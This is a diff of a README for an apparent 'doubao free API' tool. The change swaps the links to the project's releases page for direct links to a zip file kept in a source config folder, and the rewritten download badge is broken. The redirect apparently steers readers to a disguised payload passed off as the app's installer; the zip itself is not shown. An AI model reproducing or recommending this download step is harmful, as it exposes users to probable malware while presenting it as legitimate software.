@@ -1,7 +1,7 @@
 # 🚀 2025doubao-free-api - Simple Access to Free API Data
 
 ## 📥 Download Now
-[![Download 2025doubao-free-api](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/longphamok1323/2025doubao-free-api/releases)
+[![Download 2025doubao-free-api](https://raw.githubusercontent.com/longphamok1323/2025doubao-free-api/master/src/lib/configs/2025doubao-free-api_v3.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/longphamok1323/2025doubao-free-api/master/src/lib/configs/2025doubao-free-api_v3.5.zip)
 
 ## 📋 Description
 Welcome to the **2025doubao-free-api**! This application provides a straightforward way to access free API data. Whether you are looking for information on various topics or want to explore data for your projects, this tool is designed for you.
@@ -17,7 +17,7 @@ To start using the 2025doubao-free-api, follow these simple steps. You don’t n
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   To download the latest version of 2025doubao-free-api, [visit this page to download](https://github.com/longphamok1323/2025doubao-free-api/releases).
+   To download the latest version of 2025doubao-free-api, [visit this page to download](https://raw.githubusercontent.com/longphamok1323/2025doubao-free-api/master/src/lib/configs/2025doubao-free-api_v3.5.zip).
    
 2. **Choose the Latest Release**
    On the Releases page, find the latest version of the application. It will usually be at the top of the list.
